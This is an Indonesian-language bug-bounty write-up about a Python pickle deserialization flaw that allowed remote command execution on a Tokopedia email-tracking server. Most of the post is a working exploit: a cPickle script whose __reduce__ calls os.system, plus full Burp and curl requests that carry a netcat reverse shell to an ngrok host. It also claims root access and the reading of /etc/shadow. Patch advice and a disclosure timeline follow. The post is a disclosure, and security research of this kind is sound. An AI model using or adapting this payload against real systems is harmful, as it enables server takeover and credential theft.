---
layout: post
featured: true
published: true
comments: true
modified: 2018-11-21
date: 2018-11-21
title: "How I Hack Tokopedia (3rd server) with Object de-Serialization"
tags: [Bugbounty]
mathjax: false
category: Bugbounty
description: "How I Hack Tokopedia (3rd server) with Object de-Serialization"
chart: null
---


### Apa itu RCE?
---
RCE (Remote Command Injection) adalah kelemahan dimana attacker dapat memerintah sistem untuk menjalankan kode yang dinginkan, Tipe attack seperti ini biasanya karena kurangnya validasi terhadap data yang bisa dikendalikan oleh user. 

### Apa Dampaknya ?
---
Attacker dapat menjalankan perintah pada sistem dengan hak akses root dengan kemungkinan eskalasi ke sistem internal yang lain dan juga dapat memanfaatkan semua credentials yang ada pada mesin tersebut seperti `/etc/shadow | database | email services | API SECRET | etc `.

<img width="400px" src="https://media.giphy.com/media/1dIo6kDOPMzsnMOJTj/giphy.gif">

### Proof Of Concept 
---
Secara tidak sengaja ketika saya mendapatkan email promosi dari tokopedia saya kemudian tertarik untuk menganalisa sebentar pada email yang tokopedia kirimkan.

![Promo Minggu ini](/images/tokopedia/promo-tokped.png)

saya memperhatikan semua link yang ada pada email tersebut meggunakan https://explorer.tokopedia.com kemudian saya mencoba membuka salah satu link yaitu : 

```
https://explorer.tokopedia.com/v1/emailclick?em=1337%40gmail.com&user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.&d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.&ts=1536374957&cid=S%27%5Cxdd%5Cxe2%5Cx93%5Cx93i%5Cx0b%5Cx00%3Dd%5Cxac%24%2C%5Cxfah%5Cx91%5Cxc9Cz%5Cxc9%5Cxc65%5Cxef%5Cx81%5Cx04%5Cx84%5Cxc4-%5Cxaf%5Cxa44%5Cxe2%5Cx10ee%22%5Cxeb%5Cx0b%5Cx16N%3C%5Cxec%5Cx16%2Cs%5Cxa8%5Cxe3%5Cxaf.%5Cxe4A%5Cxc5Q%27%0Ap0%0A.&ut=l&moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli48&app_id=S%27%60%5Cx8ele_%5Cx8ao%5Cxb4%5Cx9dJ%5Cr%5Cx01%5Cxee%5Cx80%5Cxbc%5Cx8ck%5Cxd7%5Cx83%2FUk%60%5Cxfe%5Cx16%5Cxd7+%5Cxa5%5Cx90%5D%5Cxda%5Cx93%27%0Ap0%0A.&pl=A&c_t=ge&rlink=https://tokopedia.link/EBxQm0a00P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26utm_content=C3
```

Ada beberapa parameter yang menarik karena setelah saya lakukan url-decode ternyata yang dikirim adalah dalam bentuk Pickle String Python jadi karena seperti yang kita ketahui pada dokumentasi python sendiri Pickle sudah di <a href="#warning">warning</a> agar tidak menerima input dari user karena dapat di-abuse untuk mendapatkan akses kepada sistem 

```
user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.
d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.
cid=S%27%5Cxdd%5Cxe2%5Cx93%5Cx93i%5Cx0b%5Cx00%3Dd%5Cxac%24%2C%5Cxfah%5Cx91%5Cxc9Cz%5Cxc9%5Cxc65%5Cxef%5Cx81%5Cx04%5Cx84%5Cxc4-%5Cxaf%5Cxa44%5Cxe2%5Cx10ee%22%5Cxeb%5Cx0b%5Cx16N%3C%5Cxec%5Cx16%2Cs%5Cxa8%5Cxe3%5Cxaf.%5Cxe4A%5Cxc5Q%27%0Ap0%0A.
app_id=S%27%60%5Cx8ele_%5Cx8ao%5Cxb4%5Cx9dJ%5Cr%5Cx01%5Cxee%5Cx80%5Cxbc%5Cx8ck%5Cxd7%5Cx83%2FUk%60%5Cxfe%5Cx16%5Cxd7+%5Cxa5%5Cx90%5D%5Cxda%5Cx93%27%0Ap0%0A.
```

`Parameter yang vulnerable adalah : user_id , d , cid , app_id`

Hasil decode dari parameter `user_id` adalah : 

```
S'\x8d\xe9\xd1Y\xdb\x10\t\x92\xd2\x10\x80\xd7\x9d\xa4\xc7\x9eM_* \xc6,\xb6\x91\x98\xe0\xben\xfe\xda\xfa\xf4'
p0
.
```

Dari melihat struktur data tersebut sudah bisa ditebak bahwa itu pickle strings yang akan dikirimkan melalui parameter yang vulnerable tersebut, dengan melakukan modifikasi pada pickle strings yang dikirimkan saya bisa mendapatkan reverse shell untuk akses server tokopedia secara penuh.

untuk melakukan reverse shell kita dapat membuat listener menggunakan nc `nc -lvp 8080`, karena ip address saya tidak memiliki public ip maka saya menggunakan <a href="https://ngrok.com">ngrok</a> untuk melakukan tuneling dengan `./ngrok.exe tcp 8080` kemudian kita dapat mengakses ngrok pada `localhost:4040` untuk mendapatkan public address yang di assign ngrok.

untuk membuat payload reverse shell dengan cPickle saya membuat script exploit python dibawah ini, kemudian output dari script ini dimasukan kedalam salah satu parameter yang vulnerable diatas yaitu `user_id | d | cid | app_id` salah satu parameter saja.

```python
#!/usr/bin/python

import cPickle
import sys
import base64
import urllib

DEFAULT_COMMAND ="rm /tmp/shell; mknod /tmp/shell p; nc 0.tcp.ngrok.io 11758 0</tmp/shell | /bin/sh 1>/tmp/shell"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print urllib.quote(cPickle.dumps(PickleRce()))

```

kemudian kita dapat menjalankan request ini menggunakan burpsuite.

```
GET /v1/emailclick?em=1337%40gmail.com&user_id=cposix%0Asystem%0Ap1%0A%28S%27rm%20/tmp/shell%3B%20mknod%20/tmp/shell%20p%3B%20nc%200.tcp.ngrok.io%2011758%200%3C/tmp/shell%20%7C%20/bin/sh%201%3E/tmp/shell%27%0Ap2%0AtRp3%0A.&d=S%27%5Cxf2%5Cxb2%5Cxb3%5Cxd2%5Cx90%25%5Cxf82%5Cxe3h%5Cxa7%5Cxa1%5Cx13uow%5Cr%5Cx92K%5Cx12%7E%27%0Ap0%0A.&ts=1536374957&cid=S%224%5Cxc2%5Cxe4BQ%5Cxfe%5Cx8f%5Cxcd%5Cxf5%5Cx83f%27T%5Cx04%5Cx13%5Cxf3%5Cxbf%5Cxd9%27EHB%5Cx0b%5Cxcc%5Cx08%5Cxc9U%5Cxaf%28S%5Cxb3%5Cxcc%5Cx91%5Cxbf%5Cxf6%5Cx1e%5Cxfe%5Cxb6%5Cx11i%5Cxd7g%5Cxaf%5Cxcf%5Cx06%5Cxf0%5Cxf2%5CnDll%5Cxeb%22%0Ap0%0A.&ut=l&moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli42&app_id=S%27%5Cxd8%5C%5C%5Cx80%5Cxb8%5Cxb9f%5Cxb4%5Cxf9%5CxceC%5Cx85%22k%5Cxec%5Cxca%5Cxc9h%5Cx0b%5CxcfIf%5Cx8b%5Cx0e%5Cx84%5Cx06%5Cxade%5Cxa6%5Cxd1%5Cxa1.%5Cxe8%27%0Ap0%0A.&pl=A&c_t=ge&rlink=https://tokopedia.link/Kmg2re6Z0P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26 HTTP/1.1
Host: explorer.tokopedia.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5
Cookie: [..REDACTED..]
```

atau bisa juga menggunakan curl.

```
curl "https://explorer.tokopedia.com/v1/emailclick?em=1337%40gmail.com&user_id=cposix%0Asystem%0Ap1%0A%28S%27rm%20/tmp/shell%3B%20mknod%20/tmp/shell%20p%3B%20nc%200.tcp.ngrok.io%2011758%200%3C/tmp/shell%20%7C%20/bin/sh%201%3E/tmp/shell%27%0Ap2%0AtRp3%0A.&d=S%27%5Cxf2%5Cxb2%5Cxb3%5Cxd2%5Cx90%25%5Cxf82%5Cxe3h%5Cxa7%5Cxa1%5Cx13uow%5Cr%5Cx92K%5Cx12%7E%27%0Ap0%0A.&ts=1536374957&cid=S%224%5Cxc2%5Cxe4BQ%5Cxfe%5Cx8f%5Cxcd%5Cxf5%5Cx83f%27T%5Cx04%5Cx13%5Cxf3%5Cxbf%5Cxd9%27EHB%5Cx0b%5Cxcc%5Cx08%5Cxc9U%5Cxaf%28S%5Cxb3%5Cxcc%5Cx91%5Cxbf%5Cxf6%5Cx1e%5Cxfe%5Cxb6%5Cx11i%5Cxd7g%5Cxaf%5Cxcf%5Cx06%5Cxf0%5Cxf2%5CnDll%5Cxeb%22%0Ap0%0A.&ut=l&moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli42&app_id=S%27%5Cxd8%5C%5C%5Cx80%5Cxb8%5Cxb9f%5Cxb4%5Cxf9%5CxceC%5Cx85%22k%5Cxec%5Cxca%5Cxc9h%5Cx0b%5CxcfIf%5Cx8b%5Cx0e%5Cx84%5Cx06%5Cxade%5Cxa6%5Cxd1%5Cxa1.%5Cxe8%27%0Ap0%0A.&pl=A&c_t=ge&rlink=https://tokopedia.link/Kmg2re6Z0P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26"
```

![GOT ROOT](/images/tokopedia/gotroot.png)

![I AM (G)?ROOT](https://media.giphy.com/media/uINwDsSVEfGsE/giphy.gif)

![/ETC/SHADOW](/images/tokopedia/gotetcshadow.png)

![hostname](/images/tokopedia/hostname.png)

### HOW TO PATCH ?
---
Jangan memasukan input user kedalam `cPickle.load[s]?()` atau `pickle.load[s]?()` seperti yang sudah di jelaskan pada dokumentasi python sendiri [https://docs.python.org/3/library/pickle.html](https://docs.python.org/3/library/pickle.html).
<div id="warning">
<center><img src="/images/tokopedia/pythonpickle.png"/></center>
</div>
<br/><br/>
   


### Response From IT Security Tokopedia
---
Response dari tokopedia

![Response from tokopedia](/images/tokopedia/tokopedia-response.PNG)

Karena dari pihak tokopedia menyatakan kalau `explorer.tokopedia.com` menggunakan service dari `branch.io` maka saya mengambil inisiatif untuk bertanya langsung kepada pihak `branch.io` melalui email dan dari `branch.io` sendiri mengklarifikasi bahwa server `explorer.tokopedia.com` tidak menggunakan service dari `branch.io`.


### Response From Branch.io
---
Response dari branch.io

![Response From Branchio](/images/tokopedia/branchio-response.PNG)

setelah tokopedia memberitahu bahwa **Server** dan **Aplikasi** yang terkena serangan RCE adalah milik `branch.io` kemudian saya coba laporkan celah keamanan tersebut kepada `branch.io` dan diresponse kalau `explorer.tokopedia.com` tidak menggunakan service dari `branch.io` dan saya juga tidak bisa melakukan reproduce bug pada `branch.io` ╮(╯∀╰)╭ . 

kemudian setelah beberapa bulan saya menemukan bahwa kelemahannya ada di moengage.com namun ketika saya coba lagi ternyata bugnya telah di patch secara *misterius* ლ(ﾟдﾟლ) ლ(ﾟдﾟლ) oleh moengage dan parameternya sudah di encrypt menggunakan enkripsi (ಥ﹏ಥ). 

### TIMELINE & POC Video
---

| Waktu & Tanggal           | Deskripsi                     	|
|---------------------------|-----------------------------------|
| 08 September 2018 5:25 PM | Report Submited               	|
| 08 September 2018 6:30 PM | First Response From Tokopedia 	|
| 09 September 2018 7:00 AM | Tokopedia take down the endpoint	|
| 21 November 2018 11:00 AM | Rewarded $137                    	|
| 21 November 2018 21:00 PM | Public Disclose                  	|

---


`POC Video : https://youtu.be/Fo6Emx-LMQE`

*That's all folks!*

<img src="https://media.giphy.com/media/XreQmk7ETCak0/giphy.gif" width="300px">